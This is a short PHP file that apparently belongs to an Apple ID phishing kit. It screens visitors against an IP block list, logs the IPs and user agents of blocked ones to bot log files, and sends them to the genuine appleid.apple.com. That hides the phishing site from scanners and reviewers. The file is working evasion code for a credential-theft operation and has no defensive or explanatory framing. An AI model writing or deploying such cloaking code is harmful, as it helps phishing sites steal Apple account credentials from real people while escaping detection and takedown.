<?php
error_reporting(1);
date_default_timezone_set("Asia/Jakarta");

require 'IpListss.php';

$ips = array($_SERVER['REMOTE_ADDR'],);
$checklistss = new App\IpBlockListss();

$random_id = sha1(rand(0,1000000));

foreach ($ips as $ip ) {
  $result = $checklistss->ipPass( $ip );
  if (!$result) {
    $msg = "FAILED: ".$checklistss->message();
        $ip = getenv("REMOTE_ADDR");
        $click = fopen("result/total_bot.txt","a");
        fwrite($click,"$ip|Onetime Access"."\n");
        fclose($click);
        $file = fopen("block_bot.txt","a");
        fwrite($file," BLOCKED ONETIME ACCESS || user-agent : ".$_SERVER['HTTP_USER_AGENT']."\n ip : ". $ip." || ".gmdate ("Y-n-d")." ----> ".gmdate ("H:i:s")."\n\n");
        header('location: https://appleid.apple.com/'.$_GET['country']);
        exit();
  }
}